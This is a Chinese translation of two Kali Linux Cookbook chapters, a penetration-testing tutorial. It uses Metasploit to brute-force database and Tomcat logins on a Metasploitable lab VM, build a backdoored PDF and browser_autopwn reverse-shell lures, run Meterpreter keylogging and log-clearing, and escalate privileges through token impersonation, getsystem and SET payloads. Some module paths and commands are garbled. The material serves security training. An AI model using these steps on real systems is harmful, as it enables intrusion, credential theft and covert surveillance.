# Kali Linux 秘籍（二）



# 第六章：漏洞利用

> 作者：Willie L. Pritchett, David De Smet

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 简介

一旦我们完成了漏洞扫描步骤，我们就了解了必要的知识来尝试利用目标系统上的漏洞。这一章中，我们会使用不同的工具来操作，包括系统测试的瑞士军刀 Metasploit。

## 6.1 安装和配置 Metasploitable

这个秘籍中，我们会安装、配置和启动 Metasploitable 2。 Metasploitable 是基于 Linux 的操作系统，拥有多种可被 Metasploit 攻击的漏洞。它由  Rapid7 （Metasploit 框架的所有者）设计。Metasploitable 是个熟悉 Meterpreter 用法的极好方式。

### 准备

为了执行这个秘籍，我们需要下列东西：

+   互联网连接

+   VirtualBox PC 上的可用空间

+   解压缩工具（这里我们使用 Windows 上的 7-Zip）

### 操作步骤

让我们开始下载 Metasploitable 2。最安全的选择是从 SourceForge 获取下载包：

1.  从这个链接下载 Metasploitable 2：<http://sourceforge.net/ projects/metasploitable/files/Metasploitable2/>。

2.  将文件包括到硬盘的某个位置。

3.  解压文件。

4.  将文件夹内容放到你储存虚拟磁盘文件的位置。

5.  打开 VirtualBox 并点击`New`按钮：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-1-1.jpg)
    
6.  点击`Next`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-1-2.jpg)
    
7.  输入 Metasploitable 2 的名称并将`Operating System: `选择为`Linux`，`Version: `选项`Ubuntu`。像下面的截图那样点击`Next`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-1-3.jpg)

8.  如果可用的话，选择 `512 MB`，并点击`Next`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-1-4.jpg)
    
9.  选项现有磁盘，并从你下载和保存 Metasploitable 2 文件夹的地方选择 VDMK 文件。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-1-5.jpg)
    
0.  你的虚拟磁盘窗口会像下面的截图那样。在这个示例中，我们完全不需要更新磁盘空间。这是因为使用 Metasploitable 的时候，你会攻击这个系统，而并不是将它用作操作系统。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-1-6.jpg)
    
1.  点击`Create`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-1-7.jpg)
    
2.  通过点击 Metasploitable 2 的名称和`Start`按钮来启动它。

### 工作原理

这个秘籍中，我们在 Virtualbox 中配置了 Metasploitable 2。我们以从`Sourceforge.net`下载 Metasploitable 开始这个秘籍，之后我们配置了 VDMK 来在 VirtualBox 中运行并以启动该系统结束。

## 6.2 掌握 Armitage，Metasploit 的图形管理工具

新版本的 Metasploit 使用叫做 Armitage 的图形化前端工具。理解 Armitage 非常重要，因为它通过提供可视化的信息，使你对 Metasploit 的使用变得简单。它封装了 Metasploit 控制台，并且通过使用它的列表功能，你可以一次看到比 Metasploit 控制台或 Meterpreter 会话更多的内容。

### 准备

需要互联网或内部网络的连接。

### 操作步骤

让我们开始操作 Armitage：

1.  从桌面上访问`Start | Kali Linux | Exploitation Tools | Network Exploitation Tools | Armitage`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-2-1.jpg)

2.  在 Armitage 的登录界面中，点击`Connect`（连接）按钮。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-2-2.jpg)
    
3.  Armitage 可能需要一些时间来连接 Metasploit。当它完成时，你可能看见下面的提示窗口。不要惊慌，一旦 Armitage 能够连接时，它会消失的。在` Start Metaspoit?`界面，点击`Yes`：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-2-3.jpg)

4.  随后你会看到 Armitage 的主窗口。我们现在讨论主窗口的三个区域（标记为`A`、`B`和`C`，在下面的截图中）。

    +   `A`：这个区域展示了预先配置的模块。你可以通过模块列表下面的搜索框来搜索。
    
    +   `B`：这个区域展示了你的活动目标，我们能够利用它的漏洞。
    
    +   `C`：这个区域展示了多个 Metasploit 标签页。它允许多个 Meterpreter 或控制台会话同时运行和展示。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-2-4.jpg)
    
    > 启动 Armitage 的一个自动化方式就是在终端窗口中键入下列命令。
    
    > ```
    > armitage
    > ```
    
### 另见

为了了解更多 Meterpreter 的信息，请见“掌握 Meterpreter”一节。

## 6.3 掌握  Metasploit 控制台（MSFCONSOLE）

这个秘籍中，我们会研究 Metasploit 控制台（MSFCONSOLE）。MSFCONSOLE 主要用于管理 Metasploit 数据库，管理会话以及配置和启动 Metasploit 模块。本质上，出于利用漏洞的目的，MSFCONSOLE 能够让你连接到主机，便于你利用它的漏洞。

你可以使用以下命令来和控制台交互：

+   `help`：这个命令允许你查看你尝试运行的命令行的帮助文档。

+   `use module`：这个命令允许你开始配置所选择的模块。

+   `set optionname module`：这个命令允许你为指定的模块配置不同的选项。

+   `exploit`：这个命令启动漏洞利用模块。

+   `run`：这个命令启动非漏洞利用模块。

+   `search module`：这个命令允许你搜索独立模块。

+   `exit`：这个命令允许你退出 MSFCONSOLE。

### 准备

需要互联网或内部网络的连接。

### 操作步骤

让我们开始探索  MSFCONSOLE：

1.  打开命令行。

2.  通过下列命令启动 MSFCONSOLE：

    ```
    msfconsole
    ```
    
3.  通过`search`命令搜索所有可用的 Linux 模块。每次我们打算执行操作时，都搜索一遍模块通常是个好主意。主要因为在 Metasploit 的不同版本之间，模块路径可能发生改变。

    ```
    search linux
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-3-1.jpg)
    
4.  使用 John the Ripper Linux 密码破解模块。

    ```
    use auxiliary/analyzse/jtr_linux
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-3-2.jpg)
    
5.  通过下列命令展示该模块的可用选项。

    ```
    show options
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-3-3.jpg)
    
6.  既然我们列出了可以对这个模块使用的选项，我们可以使用`set`命令来设置独立选项。让我们设置`JOHN_PATH`选项：

    ```
    set JOHN_PATH /usr/share/metasploit-framework/data/john/wordlists/ password.lst
    ```
    
7.  现在执行漏洞利用，我们需要输入`exploit`命令：

    ```
    exploit
    ```
    
### 更多

一旦你通过 MSFCONSOLE 获得了主机的访问，你需要使用 Meterpreter 来分发载荷。MSFCONSOLE 可以管理你的回话，而 Meterpreter 执行实际的载荷分发和漏洞利用工作。

## 6.4 掌握 Metasploit CLI（MSFCLI）

这个秘籍中，我们会探索 Metasploit CLI（MSFCLI）。Metasploit 需要接口来执行它的任务。MSFCLI 就是这样的接口。它是一个极好的接口，用于学习 Metasploit ，或测试/编写新的漏洞利用。它也可用于脚本的情况中，并且对任务使用基本的自动化。

使用 MSFCLI 的一个主要问题是，你只能够一次打开一个 shell。你也会注意到，当我们探索一些命令的时候，它比 MSFCONSOLE 慢并且复杂。最后，你需要知道你打算利用的具体漏洞来使用 MSFCLI。这会使它对于渗透测试新手有些难以使用，他们并不熟悉 Metasploit  漏洞利用列表。

MSFCLI 的一些命令是：

+   `msfcli`：这会加载 MSFCLI 可访问的所有可用漏洞利用列表。

+   `msfcli -h`：显示 MSFCLI 的帮助文档。

+   `msfcli [PATH TO EXPLOIT] [options = value]`：这是执行漏洞利用的语法。

### 准备

需要互联网或内部网络的连接。

### 操作步骤

让我们开始探索  MSFCLI：

1.  使用下列命令启动 Metasploit CLI （MSFCLI）。请耐心等待，因为这可能花一些时间，取决于你的系统速度。同时注意当 MSFCLI 加载完成时，会显示可用的漏洞利用列表。

    ```
    msfcli
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-4-1.jpg)
    
2.  显示 MSFCLI 帮助文档：

    ```
    msfcli -h
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-4-2.jpg)

3.  出于我们的演示目的，我们会执行圣诞树扫描（ Christmas Tree Scan）。我们会选择选项 A 来显示模块高级选项。

    ```
    msfcli auxiliary/scanner/portscan/xmas A
    ```
    
    > 更多圣诞树扫描的信息，请见下面的 URL：<http://en.wikipedia.org/wiki/Christmas_tree_packet>。
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-4-3.jpg)
    
4.  此外，你可以列出当前模块的概览，通过使用`S`模式。概览模式是一个极好方式，来查看可用于当前尝试执行的漏洞利用的所有选项。许多选项都是可选的，但是一小部分通常是必须的，它们允许你设置尝试利用哪个目标或端口的漏洞。

    ```
    msfcli auxiliary/scanner/portscan/xmas S
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-4-4.jpg)
    
5.  为了展示可用于此次漏洞利用的选项列表，我们使用`O`模式。选项使用中配置漏洞利用模块的方式。每个利用模块都用不同的选项集合（或者什么都没有）。任何所需的选项必须在漏洞利用执行之前设置。在下面的截图中，你会注意到许多所需选项都设为默认。如果你碰到了这种情况，你就不需要更新选项的值，除非你打算修改它。

    ```
    msfcli auxiliary/scanner/portscan/xmas O
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-4-5.jpg)
    
6.  我们使用`E`模式来执行漏洞利用。

    ```
    msfcli auxiliary/scanner/portscan/xmas E
    ```
    
    > 这里，我们使用了默认选项。
    
### 工作原理

这个秘籍中，我们以启动 MSFCLI 开始，之后搜索可用的模块，并执行该模块。在搜索的过程中，我们选修了圣诞树扫描模块并复查了 MSFCLI 界面来查看模块概览和所有可用选项。在设置完所有选项之后，我们执行了漏洞利用。

了解 Metasploit 框架分为三个不同的部分非常重要。这些部分是：

+   漏洞：这些都是弱点，要么已知要么位置。它们包含在特定的应用、阮家宝或协议中。在 Metasploit 中，漏洞按照分组，和漏洞利用列出，漏洞利用可以攻击列在它们下面的漏洞。

+   漏洞利用：漏洞利用是用来利用所发现漏洞的模块。

+   载荷：一旦成功执行了漏洞利用，必须把载荷传给被攻击的机器，以便允许我们创建 shell，运行各种命令，添加用户以及其它。

一旦你通过 MSFCONSOLE 获得了主机的访问，你需要使用 Meterpreter 来分发载荷。MSFCONSOLE 可以管理你的会话，而 Meterpreter 执行实际的载荷分发和漏洞利用工作。

## 6.5 掌握 Meterpreter

一旦你使用 Armitage，MSFCLI 或 MSFCONSOLE 获得了主机的访问权，你必须使用 Meterpreter 来传递你的载荷。MSFCONSOLE 可以管理你的会话，而 Meterpreter 执行实际的载荷分发和漏洞利用工作。

一些用于 Meterpreter 的常用命令包括：

+   `help`：这个命令允许你浏览帮助文档。

+   `background`：这个命令允许你在后台运行 Meterpreter 会话。这个命令也能为你带回 MSF 提示符。

+   `download`：这个命令允许你从受害者机器中下载文件。

+   `upload`：这个命令允许你向受害者机器上传文件。

+   `execute`：这个命令允许你在受害者机器上运行命令。

+   `shell`：这个命令允许你在受害者机器上运行 Windows shell 提示符（仅限于 Windows 主机）。

+   `session -i`：这个命令允许你在会话之间切换。

### 准备

需要满足下列要求：

+   内部网络或互联网的连接。

+   使用 Armitage，MSFCLI 或 MSFCONSOLE 由 Metasploit 创建好的，目标系统的活动会话。

### 操作步骤

让我们打开 MSFCONSOLE 来开始：

1.  首先我们以 MSFCONSOLE 中展示的活动会话开始。

2.  开始记录目标系统中用户的击键顺序：

    ```
    keyscan_start 
    ```
    
3.  转储目标系统中用户的击键顺序。击键顺序会显示在屏幕上：

    ```
    keyscan_dump 
    ```
    
4.  停止记录目标系统中用户的击键顺序。

    ```
    keyscan_stop 
    ```
    
5.  删除目标系统中的文件。

    ```
    del exploited.docx 
    ```
    
6.  清除目标系统中的事件日志。

    ```
    clearav 
    ```
    
7.  展示运行进程的列表。

    ```
    ps
    ```
    
8.  杀掉受害者系统的指定进程，使用`kill [pid]`语法。

    ```
    kill 6353
    ```
    
9.  尝试偷取目标系统上的模拟令牌。

    ```
    steal_token 
    ```
    
### 工作原理

我们以通过 Armitage，MSFCLI 或 MSFCONSOLE 预先建立的 Meterpreter 会话来开始。之后我们在目标机器上运行了多种命令。

### 更多

当我们对基于 Linux 主机使用 Meterpreter 的时候，我们能够在它上面运行 Linux 命令，就像我们操作这台机器那样。

## 6.6 Metasploitable MySQL

这个秘籍中，我们会探索如何使用 Metasploit 来攻击 MySQL 数据库服务器，使用 MySQL 扫描器模块。MySQL 是许多网站平台的选择，包括 Drupal 和 Wordpress，许多网站当前正在使用 MySQL 数据库服务器。这会使它们更容易成为 Metasploitable MySQL 攻击的目标。

### 准备

需要满足下列要求：

+   内部网络的连接。

+   运行在渗透环境中的 Metasploitable 。

+   用于执行字典攻击的单词列表。

### 操作步骤

让我们通过打开终端窗口来开始  MySQL 攻击：

1.  打开终端窗口。

2.  启动 MSFCONSOLE。

    ```
    msfconsole 
    ```
    
3.  搜索可用的 MySQL 模块。

    ```
    msfconsole mysql
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-6-1.jpg)
    
4.  使用 MySQL 扫描器模块。

    ```
    use auxiliary/scanner/mysql/mysql_login
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-6-2.jpg)
    
5.  显示模块的可用选项。

    ```
    show options
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-6-3.jpg)
    
6.  将 RHOST 设置为 Metasploitable 2 主机或目标主机的地址。

    ```
    set RHOST 192.168.10.111 
    ```
    
7.  设置用户名文件的位置。你可以选择：

    ```
    set user_file /root/Desktop/usernames.txt
    ```
    
8.  设置密码文件的位置。你可以选择：

    ```
    set pass_file /root/Desktop/passwords.txt
    ```
    
9.  执行漏洞利用：

    ```
    Exploit
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-6-4.jpg)
    
0.  Metasploit 会尝试输入包含在两个文件中的所有用户名和密码组合。找到生效的登录和密码组合旁边的`+`符号就可以了。
    
### 工作原理

这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来利用   Metasploitable 2 靶机上的 MySQL 漏洞。我们以启动控制台并搜索所有已知的 MySQL 模块来开始。在选择 MySQL 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 MySQL 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 MySQL 数据库。

### 更多

这个秘籍中，我们使用了自己生成的用户名和密码文件。有许多方法可以生成用户名和密码单词列表，这些方法在第八章中涉及。

## 6.7 Metasploitable PostgreSQL

这个秘籍中，我们会探索如何使用 Metasploit 来攻击 PostgreSQL 数据库服务器，使用 PostgreSQL 扫描器模块。PostgreSQL 被誉为全世界最先进的开源数据库，许多爱好者声称它是企业级的数据库。我们会使用 Metasploit 来爆破 PostgreSQL 登录。

### 准备

需要满足下列要求：

+   内部网络的连接。

+   运行在渗透环境中的 Metasploitable 。

+   用于执行字典攻击的单词列表。

### 操作步骤

让我们通过打开终端窗口来开始 PostgreSQL 攻击：

1.  打开终端窗口。

2.  启动 MSFCONSOLE。

    ```
    msfconsole 
    ```
    
3.  搜索可用的 PostgreSQL 模块。

    ```
    msfconsole postgresql
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-7-1.jpg)
    
4.  使用 PostgreSQL 扫描器模块。

    ```
    use auxiliary/scanner/mysql/postgres_login
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-7-2.jpg)
    
5.  显示模块的可用选项。

    ```
    show options
    ```
        
6.  将 RHOST 设置为 Metasploitable 2 主机或目标主机的地址。

    ```
    set RHOST 192.168.10.111 
    ```
    
7.  设置用户名文件的位置。你可以选择：

    ```
    set user_file /root/Desktop/usernames.txt
    ```
    
8.  设置密码文件的位置。你可以选择：

    ```
    set pass_file /root/Desktop/passwords.txt
    ```
    
9.  执行漏洞利用：

    ```
    Exploit
    ```
        
0.  Metasploit 会尝试输入包含在两个文件中的所有用户名和密码组合。找到生效的登录和密码组合旁边的`+`符号就可以了。
    
### 工作原理

这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来利用   Metasploitable 2 靶机上的 PostgreSQL 漏洞。我们以启动控制台并搜索所有已知的 PostgreSQL 模块来开始。在选择 PostgreSQL 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 PostgreSQL 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 PostgreSQL 数据库。之后找到生效的登录和密码组合旁边的`+`符号就可以了。

### 更多

这个秘籍中，我们使用了默认的 PostgreSQL  用户名和密码文件。然而我们也可以创建自己的文件。有许多方法可以生成用户名和密码单词列表，这些方法在第八章中涉及。

## 6.8 Metasploitable Tomcat

这个秘籍中，我们会探索如何使用 Metasploit 攻击 Tomcat 服务器，使用 Tomcat Manager Login 模块。Tomcat，或 Apache Tomcat，是开源的 Web 服务器，和 Servlet 容器，用于运行 Java Servt 和 JSP。Tomcat 服务器纯粹使用 Java 编写。我们会使用 Metasploit 来爆破 Tomcat 的登录。

### 准备

需要满足下列要求：

+   内部网络的连接。

+   运行在渗透环境中的 Metasploitable 。

+   用于执行字典攻击的单词列表。

### 操作步骤

让我们通过打开终端窗口来开始这个秘籍：

1.  打开终端窗口。

2.  启动 MSFCONSOLE。

    ```
    msfconsole 
    ```
    
3.  搜索可用的 Tomcat 模块。

    ```
    msfconsole tomcat
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-8-1.jpg)
    
4.  使用 Tomcat Application Manager Login Utility。

    ```
    use auxiliary/scanner/http/tomcat_mgr_login 
    ```
    
5.  显示模块的可用选项。

    ```
    show options
    ```
    
    > 要注意我们有很多设置为“是”的项目，它们都是必须的。我们使用它们的默认值。
        
6.  设置`Pass_File`：

    ```
    PASS_FILE meset /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt
    ```
    
7.  设置`Pass_File`：

    ```
    USER_FILE mset /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt
    ```

8.  设置目标的`RHOST`，这里我们选择我们的 Metasploitable 2 主机：

    ```
    set RHOSTS 192.168.10.111
    ```
    
9.  将`RPORT`设置为 8180：

    ```
    set RPORT 8180
    ```
    
0.  执行漏洞利用：

    ```
    Exploit
    ```
    
### 工作原理

这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来利用   Metasploitable 2 靶机上的 Tomcat 漏洞。我们以启动控制台并搜索所有已知的 Tomcat 模块来开始。在选择 Tomcat 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 Tomcat 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 Tomcat 数据库。之后找到生效的登录和密码组合旁边的`+`符号就可以了。

## 6.9 Metasploitable PDF

这个秘籍中，我们会探索如何使用 Metasploit 来执行攻击，使用 Adobe PDF 内嵌模块来利用 PDF 文档漏洞。Adobe PDF 是文档传输的标准。由于它的广泛使用，尤其是由于它的商业用途，我们会通过让用户认为他们打开了来自求职岗位的正常 PDF 文档来攻击用户的机器。

### 准备

需要满足下列要求：

+   内部网络的连接。

+   运行在渗透环境中的 Metasploitable 。

+   用于执行字典攻击的单词列表。

### 操作步骤

让我们通过打开终端窗口来开始这个秘籍：

1.  打开终端窗口。

2.  启动 MSFCONSOLE。

    ```
    msfconsole 
    ```
    
3.  搜索可用的 PDF 模块。

    ```
    msfconsole pdf
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-9-1.jpg)
    
4.  使用 PDF 内嵌模块：

    ```
    use exploit/windows/fileformat/adobe_pdf_embedded_exe 
    ```
    
5.  显示模块的可用选项。

    ```
    show options
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-9-2.jpg)
    
6.  设置我们想要生成的 PDF 文件名称：

    ```
    set FILENAME evildocument.pdf
    ```
    
7.  设置 INFILENAME 选项。它是你打算使用的 PDF 文件的位置。这里，我使用桌面上的简历。

    ```
    set INFILENAME /root/Desktop/willie.pdf
    ```
    
    > 要注意，这个模块的所有选项都是可选的，除了`INFILENAME `。
    
8.  执行漏洞利用：

    ```
    Exploit
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-9-3.jpg)
    
### 工作原理

这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 创建了包含 Meterpreter 后门的 PDF 文件。我们以启动控制台并搜索所有可用的 PDF 漏洞来开始。在选择 PDF 内嵌模块之后，我们设置选项并执行漏洞利用，这让我们在正常的 PDF 中埋下后门程序。Metasploit 会生成带有 Windows 反向 TCP 载荷的 PDF。当你的目标打开 PDF 文件时，Meterpreter 会开启答复并激活会话。

## 6.10 实现 browser_autopwn

浏览器 Autopwn 是 Metasploit 提供的辅助模块，在受害者访问网页时，让你能够自动化对它们的攻击。浏览器 Autopwn 在攻击之前指定客户端的指纹识别，也就是说他不会对 IE 7 尝试利用 Firefox 的漏洞。基于它的浏览器判断，它决定最适于实施哪个漏洞利用。

### 准备

需要互联网或内部网络的连接。

### 操作步骤

让我们通过打开终端窗口来开始这个秘籍：

1.  打开终端窗口。

2.  启动 MSFCONSOLE：

    ```
    msfconsole 
    ```
    
3.  搜索可用的 `autopwn` 模块。

    ```
    msfconsole autopwn
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/6-10-1.jpg)
    
4.  使用` browser_autopwn `模块：

    ```
    Use auxiliary/server/browser_autopwn
    ```
    
5.  设置我们的载荷，这里我们使用 Windows 反向 TCP：

    ```
    set payload windows/meterpreter/reverse_tcp 
    ```
    
6.  显示可用于该载荷类型的选项。

    ```
    show options
    ```
    
7.  设置反向连接所使用的 IP。这里，该 PC 的 IP 地址为` 192.168.10.109`。

    ```
    set LHOST 192.168.10.109
    ```
    
8.  下面，我们打算设置 URIPATH，这里我们使用`"filetypes"`（带引号）：

    ```
    set URIPATH "filetypes" 
    ```
    
9.  最后，我们执行漏洞利用：

    ```
    exploit
    ```
    
0.  Metasploit 会在 IP 地址 <http://[Provided IP Address]:8080> 处执行漏洞利用。

1.  当访问者访问这个地址时，`browser_autopwn`模块尝试连接用户的机器来建立远程会话。如果成功的话，Meterpreter 会确认这个会话。使用会话命令来激活它：

    ```
    session –I 1
    ```
    
2.  为了显示我们可以使用的 Meterpreter 命令列表，输入`help`。

    ```
    help
    ```
    
3.  会显示可用命令的列表。这里，我们启动击键顺序扫描：

    ```
    keyscan_start 
    ```
    
4.  为了得到受害者机器上的击键顺序，我们键入`keyscan_start`命令：

    ```
    keyscan_dump
    ```
    
### 工作原理

这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来执行 browser_autopwn 漏洞利用。我们以启动控制台并搜索所有已知的`autopwn`模块开始。在喧嚣`autopwn`模块之后，我们将载荷设置为`windows_reverse_tcp`。这允许我们在利用成功时得到返回的链接。一旦受害者访问了我们的网页，漏洞利用就成功了，我们就能得到 Meterpreter 活动会话。


# 第七章：权限提升

> 作者：Willie L. Pritchett, David De Smet

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 简介

我们已经获得了想要攻击的计算机的权限。于是将权限尽可能提升就非常重要。通常，我们能访问较低权限的用户账户（计算机用户），但是，我们的目标账户可能是管理员账户。这一章中我们会探索几种提升权限的方式。

## 7.1 使用模拟令牌

这个秘籍中，我们会通过使用模拟令牌，模拟网络上的另一个用户。令牌包含用于登录会话和识别用户、用户组合用户权限的安全信息。当用户登入 Windows 系统是，它们会得到一个访问令牌，作为授权会话的一部分。令牌模拟允许我们通过模拟指定用户来提升自己的权限。例如，系统账户可能需要以管理员身份运行来处理特定的任务。并且他通常会在结束后让渡提升的权限。我们会使用这个弱点来提升我们的访问权限。

### 准备

为了执行这个秘籍，我们需要：

+ 内部网络或互联网的连接。

+ 受害者的目标主机

### 操作步骤

我们从 Meterpreter  开始探索模拟令牌。你需要使用 Metasploit  来攻击主机，以便获得 Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得访问权限。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-1-1.jpg)

下面是具体步骤：

1.  我们可以在 Meterpreter 使用`incognito`来开始模拟过程：

    ```
    use incognito
    ```
    
2.  展示`incognito`的帮助文档，通过输入`help`命令：

    ```
    help
    ```
    
3.  你会注意到我们有几个可用的选项：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-1-2.jpg)
    
4.  下面我们打算获得可用用户的列表，这些用户当前登入了系统，或者最近访问过系统。我们可以通过以`-u`执行`list_tokens`命令来完成它。

    ```
    list_tokens –u
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-1-3.jpg)
    
5.  下面，我们执行模拟攻击。语法是`impersonate_token [name of the account to impersonate]`。

    ```
    impersonate_token \\willie-pc\willie 
    ```
    
6.  最后，我们选择一个 shell 命令来运行。如果我们成功了，我们就以另一个用户的身份在使用当前系统。

### 工作原理

这个秘籍中，我们以具有漏洞的主机开始，之后使用 Meterpreter 在这台主机上模拟另一个用户的令牌。模拟攻击的目的是尽可能选择最高等级的用户，最好是同样跨域连接的某个人，并且使用它们的账户来深入挖掘该网络。

## 7.2 本地提权攻击

这个秘籍中，我们会在一台具有漏洞的主机上进行提权。本地提权允许我们访问系统或域的用户账户，从而利用我们所连接的当前系统。

### 准备

为了执行这个秘籍，我们需要：

+ 内部网络或互联网的连接。

+ 使用 Metasploit 框架的具有漏洞的主机。

### 操作步骤

让我们在 Meterpreter shell 中开始执行本地提权攻击。你需要使用 Metasploit 攻击某个主机来获得 Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得主机的访问。

1.  一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-2-1.jpg)

2.  下面，使用`-h`选项查看`getsystem `的帮助文件：

    ```
    getsystem –h
    ```
    
3.  最后我们不带任何选项来运行`getsystem`：

    ```
    getsystem
    ```
    
    > 如果你尝试获得 Windows 7 主机的访问，你必须在执行`getsystem`命令之前执行`bypassuac `。`bypassuac `允许你绕过[微软的用户账户控制](http://windows.microsoft.com/en-us/windows7/products/ features/user-account-control)。这个命令这样运行：`run post/windows/escalate/bypassuac`。
    
4.  下面，我们执行最后的命令来获取访问。

5.  这就结束了。我们已经成功进行了提权攻击。

### 工作原理

这个秘籍中，我们使用了 Meterpreter 对受害者的主机进行本地提权攻击。我们从 Meterpreter 中开始这个秘籍。之后我们执行了`getsystem `命令，它允许 Meterpreter 尝试在系统中提升我们的证书。如果成功了，我们就有了受害者主机上的系统级访问权限。

## 7.3 掌握社会工程工具包（SET）

这个秘籍中，我们会探索社会工程工具包（SET）。SET 是个包含一些工具的框架，让你能够通过骗术来攻击受害者。SET 由  David Kennedy 设计。这个工具很快就成为了渗透测试者工具库中的标准。

### 操作步骤

掌握 SET 的步骤如下所示。

1.  打开终端窗口，通过按下终端图标，并访问 SET 所在的目录：

    ```
    se-toolkit
    ```
    
2.  完成之后，你会看到 SET 菜单。SET 菜单有如下选项：


    + Social-Engineering Attacks （社会工程攻击）
    + Fast-Track Penetration Testing （快速跟踪渗透测试）
    + Third Party Modules （第三方模块）
    + Update the Metasploit Framework （更新 Metasploit 框架）
    + Update the Social-Engineer Toolkit （更新社会工程工具包）
    + Update SET configuration （更新 SET 配置）
    + Help, Credits, and About （帮助，作者和关于）
    + Exit the Social-Engineer Toolkit（退出社会工程工具包）
    
    > 在进行攻击之前，最好先将升级 SET ，因为作者经常会升级它。
    
    这些选项如下图所示：
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-3-1.jpg)
    
3.  出于我们的目的，我们选择第一个选项来开始社会工程攻击：

    ```
    1
    ```
    
4.  我们现在会看到社会工程攻击的列表，它们展示在下面的截图中。出于我们的目的，我们使用` Create a Payload and Listener`（创建载荷和监听器，选项 4）。

    ```
    4
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-3-2.jpg)

5.  下面，我们被询问输入载荷的 IP 来反转链接。这里，我们输入我们的 IP 地址：

    ```
    192.168.10.109
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-3-3.jpg)
    
6.  你会看到载荷的列表和描述，它们为`Payload and Listener`选项生成。选择`Windows Reverse_TCP Meterpreter`。这会让我们连接到目标上，并对其执行 Meterpreter 载荷。

    ```
    2
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-3-4.jpg)
    
7.  最后，我们被询问作为监听器端口的端口号。已经为你选择了 443，所以我们就选择它了。

    ```
    443
    ```
    
8.  一旦载荷准备完毕，你会被询问来启动监听器，输入`Yes`：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-3-5.jpg)
    
9.  你会注意到 Metasploit 打开了一个处理器。

